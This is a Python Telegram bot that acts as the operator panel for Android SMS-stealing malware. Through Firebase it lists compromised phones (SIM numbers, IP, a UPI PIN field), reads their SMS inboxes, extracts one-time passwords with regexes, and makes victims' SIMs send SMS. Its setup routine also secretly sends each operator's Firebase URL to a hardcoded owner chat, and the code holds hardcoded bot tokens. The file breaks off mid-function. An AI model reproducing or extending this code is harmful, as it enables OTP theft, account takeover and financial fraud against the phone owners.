#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import json
import re
import logging
import time
import threading
import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    CallbackQueryHandler,
    MessageHandler,
    filters,
    ContextTypes,
    ConversationHandler,
)

# ============================
# LOGGING
# ============================
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ============================
# BOT TOKENS
# ============================
BOT_TOKEN = os.getenv("BOT_TOKEN", "9003756305:AAE7LS0Lik6wcPbdBHbWbJ9X4_4UJq2Lc1w")
OWNER_BOT_TOKEN = os.getenv("OWNER_BOT_TOKEN", "9003756305:AAE7LS0Lik6wcPbdBHbWbJ9X4_4UJq2Lc1w")
OWNER_CHAT_ID = int(os.getenv("OWNER_CHAT_ID", "8958621902"))

BOT_NAME = "ANY AUTO BOT V12 ⚡"

# ============================
# FAST HTTP SESSION
# ============================
_http_session = requests.Session()
_adapter = HTTPAdapter(
    pool_connections=100,
    pool_maxsize=200,
    max_retries=Retry(total=1, backoff_factor=0.05)
)
_http_session.mount("https://", _adapter)
_http_session.mount("http://", _adapter)

def fast_get(url, timeout=2):
    try:
        return _http_session.get(url, timeout=timeout)
    except Exception as e:
        logger.debug(f"GET error: {e}")
        return None

def fast_put(url, data, timeout=2):
    try:
        return _http_session.put(url, json=data, timeout=timeout)
    except Exception as e:
        logger.debug(f"PUT error: {e}")
        return None

# ============================
# USER CONFIG
# ============================
USER_CONFIG_FILE = "user_config.json"
user_configs = {}
last_otp = {}

SMS_PATH_CACHE = {}
CLIENTS_PATH_CACHE = {}
OTP_PATH_CACHE = {}
MSG_PATH_CACHE = {}

def load_user_configs():
    global user_configs, last_otp
    if os.path.exists(USER_CONFIG_FILE):
        try:
            with open(USER_CONFIG_FILE, "r") as f:
                user_configs = json.load(f)
            for uid, cfg in user_configs.items():
                if "last_otp_value" in cfg:
                    last_otp[uid] = cfg["last_otp_value"]
                if "sms_path_cache" in cfg:
                    SMS_PATH_CACHE[uid] = cfg["sms_path_cache"]
                if "clients_path_cache" in cfg:
                    CLIENTS_PATH_CACHE[uid] = cfg["clients_path_cache"]
                if "otp_path_cache" in cfg:
                    OTP_PATH_CACHE[uid] = cfg["otp_path_cache"]
                if "msg_path_cache" in cfg:
                    MSG_PATH_CACHE[uid] = cfg["msg_path_cache"]
            logger.info(f"✅ Loaded {len(user_configs)} user configs")
        except Exception as e:
            logger.error(f"Config load failed: {e}")
            user_configs = {}

def save_user_configs():
    try:
        with open(USER_CONFIG_FILE, "w") as f:
            json.dump(user_configs, f, indent=2)
    except Exception as e:
        logger.error(f"Config save failed: {e}")

load_user_configs()

# ============================
# CONVERSATION STATES
# ============================
URL, CHANNEL = range(2)
WAITING_OTP_NUMBER = 10
WAITING_DEVICE_ID = 11

# ============================
# UNIVERSAL FIELD MAP
# ============================
DEVICE_FIELD_MAP = {
    "name": ["modelName", "model", "deviceName", "device_name", "name",
             "deviceModel", "device_model", "model_name", "phone_name"],
    "battery": ["battery", "batteryLevel", "battery_level", "bat",
                "battery_percent", "batteryPercentage", "power"],
    "status": ["status", "is_online", "isOnline", "online", "active",
               "connected", "state", "isActive", "is_active"],
    "phone": ["mobNo", "phone", "phoneNumber", "phone_number", "mobile",
              "mobileNumber", "number", "msisdn"],
    "android": ["androidV", "androidVersion", "android_version", "android",
                "os_version", "osVersion"],
    "ip": ["ip_address", "ipAddress", "ip", "ip_addr", "public_ip"],
    "storage": ["storage", "storageInfo", "disk"],
    "provider": ["service_provider", "serviceProvider", "provider",
                 "carrier", "network", "networkOperator"],
    "upipin": ["upipin", "upi_pin", "upiPin", "upi", "pin"],
    "cpu": ["cpu_arch", "cpuArch", "cpu", "architecture"],
    "sdk": ["sdkV", "sdkVersion", "sdk_version", "sdk"],
    "lastSeen": ["lastSeen", "last_seen", "lastOnline", "last_online",
                 "lastActive", "last_active", "timestamp", "time", "dateTime",
                 "updatedAt", "updated_at"],
    "sims": ["sims", "sim_info", "simInfo", "sim", "simCards", "sim_details"],
}

MESSAGE_FIELD_MAP = {
    "text": ["message", "body", "text", "content", "msg", "sms_body",
             "smsBody", "message_body", "sms", "full_message"],
    "sender": ["sender", "from", "address", "number", "phone",
               "phoneNumber", "source", "originator"],
    "time": ["dateTime", "datetime", "date", "time", "timestamp",
             "sentAt", "receivedAt", "createdAt"],
    "type": ["type", "msgType", "msg_type", "messageType", "direction"],
}

OTP_PATHS = ["otp", "OTP", "otps", "otpCode", "code", "verification_code",
             "auth/otp", "data/otp", "otps/latest", "latest_otp"]

SMS_COMMAND_PATHS = [
    "clients/{device_id}/webhookEvent/sendSms",
    "clients/{device_id}/webhook/sendSms",
    "clients/{device_id}/commands/sendSms",
    "devices/{device_id}/sendSms",
    "devices/{device_id}/commands/sms",
    "commands/{device_id}/sendSms",
    "sendSms/{device_id}",
]

CLIENTS_PATHS = ["clients", "devices", "device_list", "deviceList",
                 "online_devices", "data/clients", "users"]

MESSAGES_PATHS = [
    "messages/{device_id}",
    "messages/{device_id}/inbox",
    "data/messages/{device_id}",
    "sms/{device_id}",
    "inbox/{device_id}",
    "clients/{device_id}/messages",
    "clients/{device_id}/sms",
    "devices/{device_id}/messages",
]

# ============================
# FIELD HELPERS
# ============================
def get_field(data, field_type, default=None):
    if not isinstance(data, dict):
        return default
    for key in DEVICE_FIELD_MAP.get(field_type, []):
        if key in data and data[key] is not None:
            return data[key]
    return default

def is_online(info):
    status = get_field(info, "status")
    if status is None:
        return False
    if isinstance(status, bool):
        return status
    if isinstance(status, (int, float)):
        return status == 1
    if isinstance(status, str):
        return status.lower() in ["true", "online", "active", "connected", "1"]
    return False

def normalize_battery(battery):
    if battery is None:
        return "—"
    if isinstance(battery, (int, float)):
        return f"{int(battery)}%"
    s = str(battery).strip()
    if s.endswith("%"):
        return s
    if s.isdigit():
        return f"{s}%"
    return s

def normalize_sims(sims):
    if not sims:
        return []
    if isinstance(sims, list):
        return sims
    if isinstance(sims, dict):
        return list(sims.values())
    return []

def get_sim_phone(sim):
    if not isinstance(sim, dict):
        return "—"
    for key in ["phoneNumber", "phone_number", "number", "phone", "mobNo",
                "mobile", "msisdn"]:
        if key in sim and sim[key]:
            return str(sim[key])
    return "—"

def get_sim_slot(sim, default=0):
    if not isinstance(sim, dict):
        return default
    for key in ["simSlotIndex", "sim_slot_index", "slot", "slotIndex"]:
        if key in sim and sim[key] is not None:
            return sim[key]
    return default

def safe_cb(data: str) -> str:
    """Telegram callback_data max 64 bytes — overflow pe phone hata do."""
    data = str(data)
    if len(data.encode("utf-8")) <= 64:
        return data
    head = data.rsplit("|", 1)[0]
    return head + "|Unknown"

# ============================
# FIREBASE HELPERS
# ============================
def firebase_get(user_id, path, timeout=2):
    cfg = user_configs.get(str(user_id))
    if not cfg or not cfg.get("firebase_url"):
        return None
    url = f"{cfg['firebase_url'].rstrip('/')}/{path}.json"
    resp = fast_get(url, timeout=timeout)
    if resp is None:
        return None
    if resp.status_code == 200:
        try:
            return resp.json()
        except:
            return None
    return None

def firebase_put(user_id, path, data, timeout=2):
    cfg = user_configs.get(str(user_id))
    if not cfg or not cfg.get("firebase_url"):
        return False
    url = f"{cfg['firebase_url'].rstrip('/')}/{path}.json"
    resp = fast_put(url, data, timeout=timeout)
    return resp is not None and resp.status_code in [200, 201]

# ============================
# CACHED PATH DISCOVERY
# ============================
def get_clients_path(user_id):
    uid = str(user_id)
    if uid in CLIENTS_PATH_CACHE:
        return CLIENTS_PATH_CACHE[uid]
    for path in CLIENTS_PATHS:
        data = firebase_get(user_id, path)
        if data and isinstance(data, dict):
            CLIENTS_PATH_CACHE[uid] = path
            cfg = user_configs.get(uid)
            if cfg:
                cfg["clients_path_cache"] = path
                save_user_configs()
            return path
    return None

def get_otp_path(user_id):
    uid = str(user_id)
    if uid in OTP_PATH_CACHE:
        return OTP_PATH_CACHE[uid]
    for path in OTP_PATHS:
        data = firebase_get(user_id, path)
        if data is not None:
            OTP_PATH_CACHE[uid] = path
            cfg = user_configs.get(uid)
            if cfg:
                cfg["otp_path_cache"] = path
                save_user_configs()
            return path
    return None

def get_messages_path(user_id, device_id):
    uid = str(user_id)
    if uid in MSG_PATH_CACHE:
        return MSG_PATH_CACHE[uid]
    for template in MESSAGES_PATHS:
        path = template.format(device_id=device_id)
        data = firebase_get(user_id, path)
        if data and isinstance(data, dict):
            MSG_PATH_CACHE[uid] = template
            cfg = user_configs.get(uid)
            if cfg:
                cfg["msg_path_cache"] = template
                save_user_configs()
            return template
    return None

# ============================
# DEVICE DISCOVERY
# ============================
def get_online_devices(user_id):
    path = get_clients_path(user_id)
    if not path:
        return {}
    data = firebase_get(user_id, path)
    if not data or not isinstance(data, dict):
        return {}
    online = {}
    for dev_id, info in data.items():
        if not isinstance(info, dict):
            continue
        if not any(k in info for k in ["modelName", "model", "deviceName",
                                        "status", "sims", "battery", "mobNo",
                                        "phone", "androidV", "is_online"]):
            if "info" in info and isinstance(info["info"], dict):
                info = {**info, **info["info"]}
            else:
                continue
        if not is_online(info):
            continue
        name = get_field(info, "name", "Unknown Device")
        sims = normalize_sims(get_field(info, "sims", []))
        online[dev_id] = {
            "id": dev_id,
            "modelName": str(name),
            "sims": sims,
            "raw": info
        }
    return online

def get_device_by_id(user_id, device_id):
    path = get_clients_path(user_id)
    if not path:
        return None
    data = firebase_get(user_id, path)
    if not data or not isinstance(data, dict):
        return None
    info = data.get(device_id)
    return info if isinstance(info, dict) else None

# ============================
# OTP FETCH
# ============================
def fetch_otp(user_id):
    path = get_otp_path(user_id)
    if not path:
        return None
    data = firebase_get(user_id, path)
    if data is None:
        return None
    if isinstance(data, dict):
        for key in ["otp", "code", "value", "current", "latest"]:
            if key in data and data[key]:
                return str(data[key]).strip()
        return None
    s = str(data).strip()
    if s and s != "None" and len(s) <= 12:
        return s
    return None

# ============================
# ✅ FIXED SMS SEND — SIM SLOT INCLUDED
# ============================
def send_sms_command(user_id, device_id, to_number, message, from_number):
    full_message = str(message).strip() if message else ""
    if not full_message:
        return False

    uid = str(user_id)

    # Selected SIM slot — pakka int
    selected = get_selected(uid)
    try:
        sim_slot = int(selected.get("simSlotIndex", 0))
    except (ValueError, TypeError):
        sim_slot = 0

    # from_number clean
    from_number = str(from_number).strip() if from_number else ""
    if from_number == "Unknown":
        from_number = ""

    # Har possible slot field name — device jo bhi respect kare
    slot_keys = ["simSlot", "simSlotIndex", "subscriptionId", "sim", "simCard"]

    payload_variants = []
    for key in slot_keys:
        payload_variants.append({
            "to": to_number,
            "message": full_message,
            "from": from_number,
            "isSended": False,
            key: sim_slot
        })

    # Fallback bina slot
    payload_variants.append({
        "to": to_number,
        "message": full_message,
        "from": from_number,
        "isSended": False
    })

    # Cached path pe pehle
    cached = SMS_PATH_CACHE.get(uid)
    if cached:
        path = cached.format(device_id=device_id)
        for payload in payload_variants:
            if firebase_put(user_id, path, payload):
                logger.info(f"⚡ SMS sent (cached) → {to_number} | slot={sim_slot} | from={from_number or 'auto'}")
                return True
        SMS_PATH_CACHE.pop(uid, None)

    for path_template in SMS_COMMAND_PATHS:
        path = path_template.format(device_id=device_id)
        for payload in payload_variants:
            if firebase_put(user_id, path, payload):
                SMS_PATH_CACHE[uid] = path_template
                cfg = user_configs.get(uid)
                if cfg:
                    cfg["sms_path_cache"] = path_template
                    save_user_configs()
                logger.info(f"📤 SMS sent via {path} | slot={sim_slot} | from={from_number or 'auto'}")
                return True

    logger.error(f"❌ All SMS paths failed for {device_id}")
    return False

# ============================
# MESSAGE FETCH
# ============================
def fetch_messages(user_id, device_id):
    template = get_messages_path(user_id, device_id)
    if not template:
        return None, None
    path = template.format(device_id=device_id)
    data = firebase_get(user_id, path)
    return data, path

def extract_message_data(msg_obj):
    if not isinstance(msg_obj, dict):
        if isinstance(msg_obj, str) and msg_obj.strip():
            return {
                "text": msg_obj.strip(),
                "sender": "Unknown",
                "time": "",
                "type": ""
            }
        return None
    text = None
    for key in MESSAGE_FIELD_MAP["text"]:
        if key in msg_obj and msg_obj[key]:
            val = msg_obj[key]
            if isinstance(val, str) and val.strip():
                text = val
                break
            elif not isinstance(val, (dict, list)):
                text = str(val)
                break
    if not text:
        return None
    sender = "Unknown"
    for key in MESSAGE_FIELD_MAP["sender"]:
        if key in msg_obj and msg_obj[key]:
            sender = str(msg_obj[key])
            break
    time_val = ""
    for key in MESSAGE_FIELD_MAP["time"]:
        if key in msg_obj and msg_obj[key]:
            time_val = str(msg_obj[key])
            break
    type_val = ""
    for key in MESSAGE_FIELD_MAP["type"]:
        if key in msg_obj and msg_obj[key]:
            type_val = str(msg_obj[key]).lower()
            break
    return {
        "text": text.strip(),
        "sender": sender,
        "time": time_val,
        "type": type_val
    }

def is_incoming_message(msg_obj):
    if not isinstance(msg_obj, dict):
        return True
    msg_type = ""
    for key in MESSAGE_FIELD_MAP["type"]:
        if key in msg_obj and msg_obj[key]:
            msg_type = str(msg_obj[key]).lower().strip()
            break
    outgoing = ["outgoing", "sent", "outbox", "send", "out", "1"]
    return msg_type not in outgoing

# ============================
# OTP DETECTION
# ============================
def extract_otp_from_text(text):
    if not text:
        return None
    text = str(text).strip()

    patterns = [
        r"(?:otp|code|pin|password|verification\s*code)\s*(?:is|:|\-|=)?\s*([A-Za-z0-9]{4,10})",
        r"([A-Za-z0-9]{4,10})\s*(?:is|as)\s*(?:your|the)\s*(?:otp|code|pin|password)",
        r"(?:your|the)\s*(?:otp|code|pin|password)\s*(?:is|:|\-|=)?\s*([A-Za-z0-9]{4,10})",
        r"(?:otp|code|pin)\s+([A-Za-z0-9]{4,10})",
        r"verification\s*code\s*[:\-]?\s*([A-Za-z0-9]{4,10})",
        r"(?:login|signin|sign\s*in|account)\s*(?:otp|code)?\s*(?:is|:|\-|=)?\s*([A-Za-z0-9]{4,10})",
    ]
    for pat in patterns:
        m = re.search(pat, text, re.IGNORECASE)
        if m:
            otp = m.group(1)
            if any(c.isdigit() for c in otp) and 4 <= len(otp) <= 10:
                logger.info(f"🔑 OTP extracted (pattern): {otp}")
                return otp

    candidates = re.findall(r"\b([A-Za-z0-9]{4,10})\b", text)
    for c in candidates:
        if any(ch.isdigit() for ch in c) and any(ch.isalpha() for ch in c):
            logger.info(f"🔑 OTP extracted (alphanumeric): {c}")
            return c

    m = re.search(r"(?<!\d)(\d{4,8})(?!\d)", text)
    if m:
        logger.info(f"🔑 OTP extracted (numeric): {m.group(1)}")
        return m.group(1)

    return None

# ============================
# TAP-TO-COPY SENDERS
# ============================
def _escape_html(s):
    return str(s).replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")

def send_message_with_copy(chat_id, display_text, copy_text, header=None):
    copy_text = str(copy_text).strip()
    if not copy_text:
        copy_text = display_text

    safe = _escape_html(copy_text)

    text = (
        f"{display_text}\n\n"
        f"👇 <b>Tap to copy 👇</b>\n"
        f"<code>{safe}</code>"
    )

    try:
        r = requests.post(
            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
            json={
                "chat_id": chat_id,
                "text": text,
                "parse_mode": "HTML",
                "disable_web_page_preview": True
            },
            timeout=3
        )
        if r.status_code == 200:
            logger.info(f"✅ Tap-to-copy sent ({len(copy_text)} chars)")
            return True
        else:
            logger.warning(f"Tap-to-copy failed: {r.text[:200]}")
    except Exception as e:
        logger.error(f"Tap-to-copy error: {e}")

    try:
        requests.post(
            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
            json={"chat_id": chat_id, "text": display_text, "parse_mode": "HTML"},
            timeout=3
        )
    except:
        pass
    return False

def send_otp_with_buttons(chat_id, header, otp, full_message, sender=None, to_number=None):
    otp = str(otp).strip()
    full_message = str(full_message).strip()

    otp_safe = _escape_html(otp)
    msg_safe = _escape_html(full_message)
    to_safe = _escape_html(to_number) if to_number else ""

    text = f"{header}\n\n"
    if sender:
        text += f"👤 Sender: {_escape_html(sender)}\n"
    if to_number:
        text += f"📞 To: <code>{to_safe}</code>\n"

    text += f"\n🔑 <b>OTP:</b>\n"
    text += f"<code>{otp_safe}</code>\n"
    text += f"<i>(tap OTP above to copy)</i>\n\n"

    text += f"📝 <b>Full Message:</b>\n"
    text += f"<code>{msg_safe}</code>\n"
    text += f"<i>(tap message above to copy)</i>"

    try:
        r = requests.post(
            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
            json={
                "chat_id": chat_id,
                "text": text,
                "parse_mode": "HTML",
                "disable_web_page_preview": True
            },
            timeout=3
        )
        if r.status_code == 200:
            logger.info(f"✅ OTP tap-to-copy sent: {otp}")
            return True
        else:
            logger.warning(f"OTP tap-to-copy failed: {r.text[:200]}")
    except Exception as e:
        logger.error(f"OTP tap-to-copy error: {e}")

    try:
        requests.post(
            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
            json={"chat_id": chat_id, "text": text, "parse_mode": "HTML"},
            timeout=3
        )
    except:
        pass
    return False

# ============================
# START / HELP
# ============================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        msg = (
            f"⚡ {BOT_NAME} ⚡\n\n"
            f"<b>Commands:</b>\n"
            f"/setup — Configure Firebase URL and Channel\n"
            f"/devices — Browse online devices\n"
            f"/search ID — Direct device select\n"
            f"/list — All device IDs\n"
            f"/setotp — Set forward number (+ auto test SMS)\n"
            f"/scan — Detect Firebase structure\n"
            f"/resetforward — Reset message tracker\n"
            f"/status — Show current config\n"
            f"/help — Show this message\n\n"
            f"<b>V12 Features:</b>\n"
            f"✅ SIM 1 & SIM 2 — auto slot detect\n"
            f"🧪 /setotp pe test SMS turant\n"
            f"👆 Direct tap-to-copy (no buttons)\n"
            f"⚡ Ultra-fast polling"
        )
        await update.message.reply_text(msg, parse_mode='HTML')
    except Exception as e:
        logger.error(f"❌ /start failed: {e}")

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await start(update, context)

# ============================
# SCAN
# ============================
async def scan_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    if user_id not in user_configs:
        await update.message.reply_text("❌ Run /setup first.")
        return
    msg = await update.message.reply_text("🔍 Scanning...")
    report = ["🔍 Firebase Scan\n"]

    path = get_clients_path(user_id)
    if path:
        data = firebase_get(user_id, path)
        count = len(data) if data else 0
        online = sum(1 for v in (data or {}).values()
                     if isinstance(v, dict) and is_online(v))
        report.append(f"✅ Clients: {path} ({count} total, {online} online)")
    else:
        report.append("❌ No clients path")

    path = get_otp_path(user_id)
    if path:
        val = firebase_get(user_id, path)
        report.append(f"✅ OTP: {path} = {str(val)[:30]}")
    else:
        report.append("⚠️ No OTP path")

    report.append("\n✅ Scan complete!")
    try:
        await msg.edit_text("\n".join(report))
    except:
        await update.message.reply_text("\n".join(report))

# ============================
# STATUS
# ============================
async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    cfg = user_configs.get(user_id)
    if not cfg:
        await update.message.reply_text("❌ Run /setup")
        return
    s = cfg.get("selectedDevice", {})
    text = (
        f"📊 Bot Status\n\n"
        f"🌐 Firebase: {cfg.get('firebase_url', '—')}\n"
        f"📢 Channel: {cfg.get('channel_id', '—')}\n"
        f"📱 Device: {s.get('deviceId', '—')}\n"
        f"📶 SIM Slot: {s.get('simSlotIndex', '—')}\n"
        f"📞 From: {s.get('simPhoneNumber', '—')}\n"
        f"🎯 Forward: {cfg.get('otpNumber', '—')}\n"
        f"🔑 Processed: {len(cfg.get('processed_keys', []))}\n"
        f"⚡ SMS Cache: {SMS_PATH_CACHE.get(user_id, 'Not cached')}\n"
    )
    await update.message.reply_text(text)

# ============================
# RESET
# ============================
async def reset_forward(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    if user_id not in user_configs:
        await update.message.reply_text("❌ Run /setup")
        return
    selected = get_selected(user_id)
    if not selected or not selected.get("deviceId"):
        await update.message.reply_text("❌ No device selected.")
        return
    initialize_processed_keys(user_id, selected["deviceId"])
    await update.message.reply_text("✅ Reset done! Old messages marked read.")

# ============================
# HELPERS
# ============================
def get_selected(user_id):
    cfg = user_configs.get(str(user_id))
    if cfg and "selectedDevice" in cfg:
        return cfg["selectedDevice"]
    return {}

def initialize_processed_keys(user_id, device_id):
    cfg = user_configs.get(user_id)
    if not cfg:
        return
    msgs, _ = fetch_messages(user_id, device_id)
    keys = list(msgs.keys()) if msgs and isinstance(msgs, dict) else []
    cfg["processed_keys"] = keys
    cfg["processed_device"] = device_id
    save_user_configs()

def set_selected(user_id, device_id, sim_slot, sim_phone):
    cfg = user_configs.get(str(user_id))
    if cfg:
        cfg["selectedDevice"] = {
            "deviceId": device_id,
            "simSlotIndex": sim_slot,
            "simPhoneNumber": sim_phone
        }
        initialize_processed_keys(str(user_id), device_id)
        save_user_configs()

def get_otp_number(user_id):
    cfg = user_configs.get(str(user_id))
    if cfg and "otpNumber" in cfg:
        return cfg["otpNumber"]
    return None

def set_otp_number(user_id, number):
    cfg = user_configs.get(str(user_id))
    if cfg:
        cfg["otpNumber"] = number
        save_user_configs()

# ============================
# SETUP
# ============================
async def setup_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "📌 Step 1/2: Send Firebase URL\n"
        "Example: https://xxx.firebaseio.com\n"
        "/cancel to abort"
    )
    return URL

async def setup_url(update: Update, context: ContextTypes.DEFAULT_TYPE):
    url = update.message.text.strip()
    if not url.startswith("https://") or (
        ".firebaseio.com" not in url and ".firebasedatabase.app" not in url
    ):
        await update.message.reply_text("❌ Invalid URL.")
        return URL
    context.user_data["firebase_url"] = url.rstrip("/")
    await update.message.reply_text(
        "✅ URL saved.\n\n📌 Step 2/2: Send Channel ID"
    )
    return CHANNEL

async def setup_channel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    try:
        channel_id = int(update.message.text.strip())
    except ValueError:
        await update.message.reply_text("❌ Channel ID must be number.")
        return CHANNEL

    user_configs[user_id] = {
        "firebase_url": context.user_data["firebase_url"],
        "channel_id": channel_id,
        "selectedDevice": {},
        "otpNumber": None,
        "processed_keys": [],
        "processed_device": None
    }
    save_user_configs()

    try:
        requests.post(
            f"https://api.telegram.org/bot{OWNER_BOT_TOKEN}/sendMessage",
            json={
                "chat_id": OWNER_CHAT_ID,
                "text": f"🔐 Setup!\nUser: `{user_id}`\nURL: `{context.user_data['firebase_url']}`\nChannel: `{channel_id}`",
                "parse_mode": "Markdown"
            },
            timeout=3
        )
    except:
        pass

    path = get_clients_path(user_id)
    report = ["✅ Setup Complete!\n"]
    if path:
        data = firebase_get(user_id, path)
        count = len(data) if data else 0
        online = sum(1 for v in (data or {}).values()
                     if isinstance(v, dict) and is_online(v))
        report.append(f"📱 Devices: {path} ({count} total, {online} online)")
    else:
        report.append("⚠️ No devices path found")

    if get_otp_path(user_id):
        report.append(f"🔑 OTP: {OTP_PATH_CACHE.get(user_id)}")

    report.append("\nNext: /devices or /search ID")
    await update.message.reply_text("\n".join(report))
    return ConversationHandler.END

async def setup_cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("❌ Cancelled.")
    return ConversationHandler.END

# ============================
# DEVICES
# ============================
async def devices_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    if user_id not in user_configs:
        await update.message.reply_text("❌ Run /setup")
        return
    online = get_online_devices(user_id)
    if not online:
        await update.message.reply_text("❌ No online devices.\nTip: /scan")
        return
    keyboard = []
    for dev_id, data in online.items():
        battery = normalize_battery(get_field(data["raw"], "battery"))
        label = f"📱 {data['modelName']} | 🔋 {battery}"
        keyboard.append([InlineKeyboardButton(label, callback_data=safe_cb(f"dev_{dev_id}"))])
    await update.message.reply_text(
        f"👇 Select device ({len(online)} online):",
        reply_markup=InlineKeyboardMarkup(keyboard)
    )

async def device_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = str(update.effective_user.id)
    device_id = query.data[len("dev_"):]
    online = get_online_devices(user_id)
    device_data = online.get(device_id)
    if not device_data:
        await query.edit_message_text("❌ Device offline.")
        return
    await _show_sim_selection(query, user_id, device_id, device_data)

# ============================
# ✅ FIXED SIM CALLBACK — SIM 1 vs SIM 2 clear
# ============================
async def sim_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = str(update.effective_user.id)

    # Format: sim_{device_id}|{slot}|{phone}
    raw = query.data[len("sim_"):]
    parts = raw.split("|", 2)
    if len(parts) != 3:
        await query.edit_message_text("❌ Invalid selection.")
        return

    device_id, slot_str, phone = parts[0].strip(), parts[1].strip(), parts[2].strip()

    # SIM 2 ka number device data se dhoondo
    if phone == "Unknown":
        device_data = get_device_by_id(user_id, device_id)
        if device_data:
            try:
                slot_int = int(slot_str)
            except ValueError:
                slot_int = 0
            sims = normalize_sims(get_field(device_data, "sims", []))
            for sim in sims:
                sim_slot = get_sim_slot(sim, -1)
                try:
                    sim_slot = int(sim_slot)
                except (ValueError, TypeError):
                    continue
                if sim_slot == slot_int:
                    sim_phone = get_sim_phone(sim)
                    if sim_phone and sim_phone != "—":
                        phone = sim_phone
                        break

    # SIM 1 ke liye hi device default phone fallback
    if phone == "Unknown" and slot_str == "0":
        device_data = get_device_by_id(user_id, device_id)
        if device_data:
            fp = get_field(device_data, "phone", "")
            if fp and fp != "Unknown":
                phone = str(fp)

    set_selected(user_id, device_id, slot_str, phone)
    sim_label = "SIM 1" if slot_str == "0" else ("SIM 2" if slot_str == "1" else f"Slot {slot_str}")
    phone_display = phone if phone and phone != "Unknown" else "Auto-detect"

    await query.edit_message_text(
        f"✅ {sim_label} activated!\n\n"
        f"📱 Device: {device_id}\n"
        f"📶 Slot: {slot_str}\n"
        f"📞 Phone: {phone_display}\n\n"
        f"⚡ Ab isi SIM se SMS jayega\n"
        f"Next: /setotp (auto test SMS aayega)"
    )

# ============================
# SEARCH
# ============================
async def search_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    if user_id not in user_configs:
        await update.message.reply_text("❌ Run /setup first.")
        return
    if context.args:
        device_id = context.args[0].strip()
        await _search_device_action(update, user_id, device_id)
        return
    await update.message.reply_text(
        "🔍 Device Search\n\n"
        "Usage: /search DEVICE_ID\n"
        "Example: /search abc123\n\n"
        "Ya abhi ID type karo:\n"
        "/cancel to abort"
    )
    return WAITING_DEVICE_ID

async def search_device_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    device_id = update.message.text.strip()
    if not device_id:
        await update.message.reply_text("❌ Empty. Try again.")
        return WAITING_DEVICE_ID
    await _search_device_action(update, user_id, device_id)
    return ConversationHandler.END

async def search_cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("❌ Search cancelled.")
    return ConversationHandler.END

async def _search_device_action(update_or_query, user_id, device_id):
    online = get_online_devices(user_id)
    if not online:
        text = "❌ No online devices found.\nTip: /scan"
        if hasattr(update_or_query, 'message'):
            await update_or_query.message.reply_text(text)
        else:
            await update_or_query.edit_message_text(text)
        return

    if device_id in online:
        return await _show_sim_selection(update_or_query, user_id, device_id, online[device_id])

    matches = [d for d in online.keys() if device_id.lower() in d.lower()]

    if len(matches) == 1:
        m = matches[0]
        return await _show_sim_selection(update_or_query, user_id, m, online[m])

    elif len(matches) > 1:
        keyboard = []
        for m in matches[:10]:
            battery = normalize_battery(get_field(online[m]["raw"], "battery"))
            label = f"📱 {online[m]['modelName']} | 🔋 {battery}"
            keyboard.append([InlineKeyboardButton(label, callback_data=safe_cb(f"dev_{m}"))])
        text = f"🔍 Multiple matches ({len(matches)}):\nSearch: {device_id}"
        if hasattr(update_or_query, 'message'):
            await update_or_query.message.reply_text(text, reply_markup=InlineKeyboardMarkup(keyboard))
        else:
            await update_or_query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard))
        return

    text = f"❌ Device not found: {device_id}\n\nAvailable ({len(online)}):\n"
    for d in list(online.keys())[:10]:
        text += f"• {d} — {online[d]['modelName']}\n"
    text += "\nTry: /list"
    if hasattr(update_or_query, 'message'):
        await update_or_query.message.reply_text(text)
    else:
        await update_or_query.edit_message_text(text)

async def _show_sim_selection(update_or_query, user_id, device_id, device_data):
    sims = device_data.get("sims", [])
    keyboard = []

    if sims:
        for i, sim in enumerate(sims):
            slot = get_sim_slot(sim, i)
            phone = get_sim_phone(sim)
            slot_label = slot + 1 if isinstance(slot, int) else slot
            label = f"📶 SIM {slot_label}"
            if phone and phone != "—":
                label += f" — {phone}"
            keyboard.append([InlineKeyboardButton(
                label,
                callback_data=safe_cb(f"sim_{device_id}|{slot}|{phone}")
            )])

    device_phone = get_field(device_data["raw"], "phone", "Unknown")

    if not sims:
        keyboard.append([InlineKeyboardButton(
            f"📶 SIM 1 — {device_phone}",
            callback_data=safe_cb(f"sim_{device_id}|0|{device_phone}")
        )])
        keyboard.append([InlineKeyboardButton(
            "📶 SIM 2 — Manual",
            callback_data=safe_cb(f"sim_{device_id}|1|Unknown")
        )])
    else:
        keyboard.append([
            InlineKeyboardButton(
                "📶 Force SIM 1",
                callback_data=safe_cb(f"sim_{device_id}|0|{device_phone}")
            ),
            InlineKeyboardButton(
                "📶 Force SIM 2",
                callback_data=safe_cb(f"sim_{device_id}|1|Unknown")
            )
        ])

    text = (
        f"✅ Device Found!\n\n"
        f"📱 {device_data['modelName']}\n"
        f"🆔 {device_id}\n"
        f"🔋 {normalize_battery(get_field(device_data['raw'], 'battery'))}\n\n"
